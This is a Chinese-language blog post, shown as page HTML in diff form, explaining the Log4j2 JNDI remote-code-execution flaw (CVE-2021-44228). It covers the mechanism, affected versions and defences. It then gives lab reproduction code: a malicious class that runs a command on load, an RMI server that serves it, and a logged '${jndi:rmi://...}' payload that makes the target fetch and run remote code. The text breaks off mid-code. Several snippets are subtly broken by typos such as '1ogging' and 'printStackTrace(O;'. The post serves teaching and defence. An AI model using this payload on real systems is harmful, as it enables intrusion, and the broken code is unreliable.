@@ -1,0 +1,893 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-BR":"Copiado com sucesso (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-BR":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';window.REIMU_CONFIG.i18n_languages = ["en"];</script>
+  
+  <title>
+    Log4j2漏洞 |
+    
+    mX1@0_blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Log4j2漏洞​		Log4j2漏洞，特别是CVE-2021-44228，是一个严重的安全漏洞，它允许攻击者通过构造特定的输入，利用**Java命名和目录接口（JNDI）执行远程代码**。以下是对该漏洞的详细解析： 1 漏洞简介​		Apache Log4j2是一个基于Java的日志记录工具，被广泛应用于业务系统开发中。它允许开发者将程序的输入输出信息进行日志记录，并可以控制日志信息输送的目的地">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j2漏洞">
+<meta property="og:url" content="http://example.com/en/2025/04/10/log4j2-lou-dong/index.html">
+<meta property="og:site_name" content="mX1@0_blog">
+<meta property="og:description" content="Log4j2漏洞​		Log4j2漏洞，特别是CVE-2021-44228，是一个严重的安全漏洞，它允许攻击者通过构造特定的输入，利用**Java命名和目录接口（JNDI）执行远程代码**。以下是对该漏洞的详细解析： 1 漏洞简介​		Apache Log4j2是一个基于Java的日志记录工具，被广泛应用于业务系统开发中。它允许开发者将程序的输入输出信息进行日志记录，并可以控制日志信息输送的目的地">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/681723f858cb8da5c8db0f21.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6817315c58cb8da5c8db5ac2.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6817449358cb8da5c8dc085b.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/681744cf58cb8da5c8dc0b4e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6817472558cb8da5c8dc119a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6817475b58cb8da5c8dc11ae.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6817638958cb8da5c8dc5641.png">
+<meta property="article:published_time" content="2025-04-10T15:41:03.063Z">
+<meta property="article:modified_time" content="2025-05-04T13:25:34.502Z">
+<meta property="article:author" content="mX1@0">
+<meta property="article:tag" content="JAVA框架漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/681723f858cb8da5c8db0f21.png">
+  
+  
+  
+    <link rel="shortcut icon" href="/images/%E5%9B%BE1.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/archives">归类</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/en/friend">链接</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+    
+  </nav>
+  
+    
+    <nav id="i18n-nav">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">English</span>
+        </div>
+        <ul class="select-items" id="select-items">
+          
+            <li data-value="zh-CN" >简体中文</li>
+          
+            <li data-value="en" class="selected">English</li>
+          
+        </ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};
+            
+              langMap['zh-CN'] = '/2025/04/10/log4j2-lou-dong/';
+            
+              langMap['en'] = '/en/2025/04/10/log4j2-lou-dong/';
+            
+            selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+          }
+        });
+      </script>
+    </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture></picture>
+        <img  fetchpriority="high" src="https://picsum.photos/1600/900?random=1" alt="Log4j2漏洞">
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Log4j2漏洞</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Log4j2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">Log4j2漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.0.1.</span> <span class="toc-text">1 漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.2.</span> <span class="toc-text">2 漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI%EF%BC%88%E4%BD%BF%E7%94%A8%E5%90%8D%E7%A7%B0%E6%9D%A5%E8%AE%BF%E9%97%AE%E5%AF%B9%E8%B1%A1%EF%BC%89"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">JNDI（使用名称来访问对象）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP%EF%BC%88%E8%BD%BB%E5%9E%8B%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">LDAP（轻型目录访问协议）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%89"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">RMI（远程方法调用）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E8%BF%87%E7%A8%8B"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">触发过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.0.3.</span> <span class="toc-text">3 漏洞影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.4.</span> <span class="toc-text">4 漏洞利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.0.5.</span> <span class="toc-text">5 防御措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.0.6.</span> <span class="toc-text">6 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E8%BF%87%E7%A8%8B%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.0.6.1.</span> <span class="toc-text">6.1 漏洞产生过程模拟</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">1.0.6.2.</span> <span class="toc-text">6.2 漏洞复现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-12-09"><span class="toc-number">1.0.6.2.1.</span> <span class="toc-text">CVE-2021-12-09</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/%E5%9B%BE1.jpg" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/friend" aria-label="链接"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">链接</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-Log4j2漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-10T15:41:03.063Z" itemprop="datePublished">2025-04-10</time>
+    <time style="display: none;" id="post-update-time">2025-05-04</time>
+  </span>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/en/categories/Apache%E6%BC%8F%E6%B4%9E/" data-aos="zoom-in">Apache漏洞</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="Log4j2漏洞"><a href="#Log4j2漏洞" class="headerlink" title="Log4j2漏洞"></a>Log4j2漏洞</h1><p>​		Log4j2漏洞，特别是CVE-2021-44228，是一个严重的安全漏洞，它允许攻击者通过构造特定的输入，利用**<u>Java命名和目录接口（JNDI）执行远程代码</u>**。以下是对该漏洞的详细解析：</p>
+<h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1 漏洞简介"></a>1 漏洞简介</h3><p>​		Apache Log4j2是一个基于Java的<strong>日志记录工具</strong>，被广泛应用于业务系统开发中。它允许开发者将程序的输入输出信息进行日志记录，并可以控制日志信息输送的目的地，如控制台、文件、GUI组件等。然而，在2021年12月，Apache官方披露了Log4j2的一个远程代码执行（RCE）漏洞，编号为CVE-2021-44228。</p>
+<h3 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2 漏洞原理"></a>2 漏洞原理</h3><p>​		在输出日志信息时允许开发人员<strong>通过相应的协议去请求远程主机上的资源</strong>。 而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源 并执行其中的代码，从而造成远程代码执行漏洞。</p>
+<p>​		该漏洞的根源在于Log4j2的<strong>递归解析</strong>功能。当Log4j2在处理日志消息时，<u><strong>如果消息中包含了<code>${</code>开头的字符串，它会被视为一个可替换的变量，并尝试通过JNDI等方式解析该变量的值</strong></u>。攻击者可以构造包含恶意JNDI查询的日志消息，从而触发JNDI注入，最终执行远程代码。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">${data:MM-dd-yyyy}</span><br><span class="line">${java:version}</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="JNDI（使用名称来访问对象）"><a href="#JNDI（使用名称来访问对象）" class="headerlink" title="JNDI（使用名称来访问对象）"></a>JNDI（使用名称来访问对象）</h4><p>​		开发人员一般会使用log4j2在日志中输出一些变量，log4j2 除了可以输出程序中的变量，它还提供了多种<strong>lookup</strong>功能插件，可以用来查找更多数据用于输出。lookup在log4j2中，就是允许在输出日志的时候，通过多种方式去查找要输出的内容，其中就可以使用Jndi Lookup。</p>
+<p>​		<strong>JNDl</strong> （Java Naming and Directory Interface，JAVA命名和目录接口）它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中<strong>可以使用名称来访问对象</strong>。JNDI下面有很多目录接口，用于不同的数据源的查找引用。	</p>
+<p><img src="https://pic1.imgdb.cn/item/681723f858cb8da5c8db0f21.png"></p>
+<p>​		JNDI可以使用相应目录接口请求普通数据，还可以请求Java对象。而且JNDI支持以命名引用(Naming References)的方式去远程下载一个class文件，然后加载该class文件并构建对象。若下载的是攻击者构建的含有恶意代码的class文件，则会在加载时执行恶意代码。</p>
+<p>​		<u><strong>在这些目录接口中我们可以使用LDAP或RMI去下载远程主机上的cIass文件。</strong></u></p>
+<h4 id="LDAP（轻型目录访问协议）"><a href="#LDAP（轻型目录访问协议）" class="headerlink" title="LDAP（轻型目录访问协议）"></a>LDAP（轻型目录访问协议）</h4><p>​		<strong>轻型目录访问协议</strong>：是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好像Linux/Unix系统中的文件目录一样。</p>
+<h4 id="RMI（远程方法调用）"><a href="#RMI（远程方法调用）" class="headerlink" title="RMI（远程方法调用）"></a>RMI（远程方法调用）</h4><p>​		远程方法调用:它是一种机制，能够让在<u><strong>某个java虚拟机上的对象调用另一个Java虚拟机的对象的方法</strong></u>。</p>
+<h4 id="触发过程"><a href="#触发过程" class="headerlink" title="触发过程"></a>触发过程</h4><p>log4j2远程代码执行漏洞大致过程(此处使用RMI，LDAP同理）：</p>
+<p>假如有一个Java程序（登陆框），输错5次密码，将该用户名存储到日志中去，</p>
+<ol>
+<li>攻击者发送一个HTTP请求，其用户名为${jndi:rmi://rmi服务器地址/Exploit)，输错5次密码后将构造好的用户名存入日志，</li>
+<li>被攻击服务器发现要输出的信息中有${}，则其中的内容要单独处理，进一步解析是JNDI扩展内容且使用的是RMI，而后根据RMI服务器地址去请求Exploit。</li>
+<li>RMI服务器返回Reference对象（用于告诉请求端所请求对象所在的类)，而该Reference指定了远端文件下载服务器上含有恶意代码的class文件。</li>
+<li>被攻击服务器通过Reference对象去请求文件下载服务器上的class文件。</li>
+<li>被攻击服务器下载恶意class文件并执行其中的恶意代码</li>
+</ol>
+<p><img src="https://pic1.imgdb.cn/item/6817315c58cb8da5c8db5ac2.png"></p>
+<h3 id="3-漏洞影响范围"><a href="#3-漏洞影响范围" class="headerlink" title="3 漏洞影响范围"></a>3 漏洞影响范围</h3><p>​		该漏洞影响Apache Log4j 2.0至2.14.1版本。一旦应用程序使用了这些版本的Log4j2，并且允许用户输入日志消息或控制日志消息的生成，就可能受到攻击。</p>
+<h3 id="4-漏洞利用方式"><a href="#4-漏洞利用方式" class="headerlink" title="4 漏洞利用方式"></a>4 漏洞利用方式</h3><p>攻击者可以通过多种方式利用该漏洞，包括但不限于：</p>
+<ul>
+<li>构造包含恶意JNDI查询的HTTP请求，发送给使用Log4j2记录HTTP请求日志的应用程序。</li>
+<li>在应用程序的输入字段中注入恶意JNDI查询，这些输入字段的值会被记录到日志中。</li>
+<li>通过其他方式触发Log4j2记录包含恶意JNDI查询的日志消息。</li>
+</ul>
+<h3 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5 防御措施"></a>5 防御措施</h3><p>为了防御该漏洞，可以采取以下措施：</p>
+<ul>
+<li><strong>升级到安全版本</strong>：将Log4j2升级到2.15.0或更高版本，这些版本已经修复了漏洞。</li>
+<li><strong>禁用JNDI功能</strong>：如果不需要JNDI功能，可以在Log4j2的配置中禁用它。</li>
+<li><strong>限制日志消息的输入</strong>：对应用程序中所有可能记录到日志的输入进行严格的验证和清理，防止恶意输入。</li>
+<li><strong>监控和检测</strong>：监控应用程序的日志文件和系统日志，以检测可能的JNDI注入攻击。</li>
+<li><strong>网络隔离</strong>：限制应用程序的外部网络访问，特别是对那些可能用于JNDI查询的端口和协议。</li>
+</ul>
+<h3 id="6-漏洞复现"><a href="#6-漏洞复现" class="headerlink" title="6 漏洞复现"></a>6 漏洞复现</h3><h4 id="6-1-漏洞产生过程模拟"><a href="#6-1-漏洞产生过程模拟" class="headerlink" title="6.1 漏洞产生过程模拟"></a>6.1 漏洞产生过程模拟</h4><p>创建一个Maven项目，在pom.xml文件中引l入log4j依赖，指定版本为2.14.1。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.1ogging.log4j&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.1ogging.1og4j&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;2.14.1&lt;/versiony</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>模拟黑客服务器：</p>
+<ol>
+<li>创建EvilObj类，执行Windows命令打开计算器。</li>
+</ol>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evilobj</span> {</span><br><span class="line">	<span class="keyword">static</span> {</span><br><span class="line">		System.out.println(<span class="string">"执行恶意代码！"</span>);</span><br><span class="line">	<span class="keyword">try</span> {</span><br><span class="line">	<span class="comment">//执行命令打开计算器</span></span><br><span class="line">	Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    }<span class="keyword">catch</span> (IOException e) {</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="2">
+<li>创建RMIServer类，用于开启RMI服务。</li>
+</ol>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> {</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">        <span class="comment">//启动rmi服务，端口为1099</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry();</span><br><span class="line">        <span class="comment">//创建资源，指定资源为本机rmi目录下的Evilobj类</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">"rmi.EvilObj"</span>,<span class="string">"rmi.EvilObj"</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referencewrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        <span class="comment">//绑定资源，用于客户机访问对应资源</span></span><br><span class="line">        registry.bind(<span class="string">"evil"</span>, referencewrapper);</span><br><span class="line">        System.out.println(<span class="string">"RMI服务初始化完成"</span>);</span><br><span class="line">	} <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">		e.printStackTrace(O;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>模拟受害主机：</p>
+<ol>
+<li>创建HackedServer类，模拟攻击者发送信息，受害服务器将对应信息作为error级别日志输出。</li>
+</ol>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hackedserver</span>{</span><br><span class="line">	<span class="comment">//创建日志记录器</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(string... args)</span>{</span><br><span class="line">		System.out.println(<span class="string">"被攻击服务器"</span>);</span><br><span class="line">		<span class="comment">//模拟攻击者发送请求中的username字段，指向攻击者服务器上的恶意class</span></span><br><span class="line">		<span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">"${jndi:rmi://192.168.200.95/evil}"</span>;</span><br><span class="line">		<span class="comment">//输出错误日志信息</span></span><br><span class="line">		